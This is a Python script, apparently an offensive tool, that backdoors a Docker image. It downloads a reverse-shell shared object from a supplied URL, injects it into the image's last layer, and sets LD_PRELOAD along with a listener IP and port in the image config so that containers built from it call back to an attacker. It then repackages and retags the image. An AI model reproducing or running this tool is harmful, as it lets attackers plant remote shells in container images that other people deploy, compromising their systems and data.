import argparse
import os
import requests
import tempfile
import shutil
import tarfile
import json
from contextlib import contextmanager

@contextmanager
def temporary_directory():
    """Create a temporary directory and clean it up after use."""
    temp_dir = tempfile.mkdtemp()
    try:
        yield temp_dir
    finally:
        shutil.rmtree(temp_dir)
        print(f"Temporary directory {temp_dir} has been deleted.")

def download_file_to_temp(url, temp_dir):
    """Download a file from a URL to a temporary file in the specified directory."""
    temp_path = os.path.join(temp_dir, 'reverse_shell.so')
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(temp_path, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    print(f"Downloaded reverse_shell.so to {temp_path}")
    return temp_path

def extract_image(image_name, temp_dir):
    """Save and extract a Docker image to a temporary directory."""
    tar_path = os.path.join(temp_dir, f"{image_name}.tar")
    os.system(f"docker save -o {tar_path} {image_name}")
    with tarfile.open(tar_path, 'r') as tar:
        tar.extractall(path=temp_dir)
    print(f"Docker image {image_name} extracted to {temp_dir}")
    return tar_path

def modify_image(temp_dir, shell_path, listener_ip, listener_port):
    """Modify the extracted Docker image to include the reverse shell."""
    # Find the last layer directory
    manifest_path = os.path.join(temp_dir, 'manifest.json')
    with open(manifest_path, 'r') as f:
        manifest = json.load(f)
    last_layer = manifest[0]['Layers'][-1].split('/')[0]

    # Copy the reverse shell into the layer
    layer_path = os.path.join(temp_dir, last_layer)
    shutil.copy2(shell_path, os.path.join(layer_path, 'reverse_shell.so'))
    print(f"Added reverse_shell.so to {layer_path}")

    # Update the config JSON
    config_path = os.path.join(temp_dir, manifest[0]['Config'])
    with open(config_path, 'r') as f:
        config = json.load(f)
    config['config']['Env'] = config.get('config', {}).get('Env', []) + [
        f"LD_PRELOAD=/reverse_shell.so",
        f"REMOTE_ADDR={listener_ip}",
        f"REMOTE_PORT={listener_port}"
    ]
    with open(config_path, 'w') as f:
        json.dump(config, f)
    print(f"Updated config JSON at {config_path}")

def repackage_image(temp_dir, output_image):
    """Repackage the modified Docker image."""
    tar_path = os.path.join(temp_dir, "modified_image.tar")
    with tarfile.open(tar_path, 'w') as tar:
        for root, _, files in os.walk(temp_dir):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, temp_dir)
                tar.add(full_path, arcname=arcname)
    os.system(f"docker load -i {tar_path}")
    
    # Get the ID of the loaded image
    loaded_image_id = os.popen("docker images -q | head -n 1").read().strip()
    
    # Tag the loaded image with the output name
    os.system(f"docker tag {loaded_image_id} {output_image}:latest")
    print(f"Docker image {output_image} repackaged and loaded")

def main():
    parser = argparse.ArgumentParser(description='Create a backdoored Docker image.')
    parser.add_argument('-i', '--input', required=True, help='Base Docker image to modify.')
    parser.add_argument('-o', '--output', required=True, help='Output Docker image name.')
    parser.add_argument('-l', '--listener', required=True, help='Listener IP address for reverse shell.')
    parser.add_argument('-p', '--port', required=True, type=int, help='Listener port for reverse shell.')
    parser.add_argument('--shell-url', required=True, help='URL to download the reverse shell .so file.')

    args = parser.parse_args()

    with temporary_directory() as temp_dir:
        shell_path = download_file_to_temp(args.shell_url, temp_dir)
        extract_image(args.input, temp_dir)
        modify_image(temp_dir, shell_path, args.listener, args.port)
        repackage_image(temp_dir, args.output)

if __name__ == "__main__":
    main()
